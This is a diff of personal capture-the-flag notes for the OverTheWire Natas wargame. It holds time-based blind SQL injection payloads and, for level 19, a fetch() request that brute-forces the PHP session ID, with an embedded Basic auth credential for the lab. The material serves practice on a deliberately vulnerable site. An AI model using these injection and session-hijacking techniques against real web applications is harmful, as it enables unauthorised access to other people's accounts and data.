@@ -120,4 +120,22 @@ We can use # as a comment
 natas18" UNION SELECT * FROM users WHERE password LIKE "a%" AND SLEEP(1)  #
 natas18" UNION SELECT * FROM users WHERE username="natas18" AND SLEEP(1)  #
 
-Natas 19: 
+Natas 19:
+
+you can solve this level by spoofing your PHPSESSION, it only goes up to 640, so just
+try all of them
+fetch("http://natas18.natas.labs.overthewire.org/", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "accept-language": "en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7",
+    "authorization": "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==",
+    "cache-control": "no-cache",
+    "pragma": "no-cache",
+    "upgrade-insecure-requests": "1",
+    "cookie": "PHPSESSID=637"
+  },
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": null,
+  "method": "GET",
+  "mode": "cors"
+});
